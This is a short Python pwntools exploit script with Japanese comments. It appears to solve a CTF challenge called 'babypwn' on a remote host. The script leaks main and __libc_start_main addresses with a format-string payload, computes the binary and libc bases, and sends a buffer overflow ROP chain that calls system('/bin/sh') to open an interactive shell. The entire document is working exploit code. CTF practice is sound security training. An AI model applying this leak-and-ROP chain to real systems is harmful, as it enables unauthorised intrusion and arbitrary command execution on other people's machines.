from pwn import *
import sys

chall = "./babypwn"
# io = process(chall)
io = remote("be.ax", 31801)

elf = ELF(chall)
libc = ELF("libc.so.6")

main =  "_ZN7babypwn4main17h8f55ddfb4d984bd7E"

# 第86引数にmainの頭
# 第87引数に__libc_start_mian+243
payload = b"%86$p %87$p"
io.sendlineafter(b"name?", payload)

io.recvuntil(b"Hi, ")
ret = io.recvline()
print("main addr: " + ret[0:14].decode())
print("__libc_start_main addr: " + ret[15:-1].decode() + " - 0xf3")

elf.address = int(ret[2:14].decode(),16) - elf.sym[main]
addr_libc_start_main = int(ret[17:-1].decode(),16) - 0xf3
libc.address = addr_libc_start_main - libc.sym["__libc_start_main"]

# ROPgadgetの準備
addr_ret = elf.address + 0x501a
addr_pop_rdi_ret = elf.address + 0x51d1

# mainのreturn addressは97バイト目から書き換えられる
payload = b"A" * 0x60
payload += p64(addr_ret)
payload += p64(addr_pop_rdi_ret)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.sym["system"])

io.sendlineafter(b"emote?\n", payload)
io.interactive()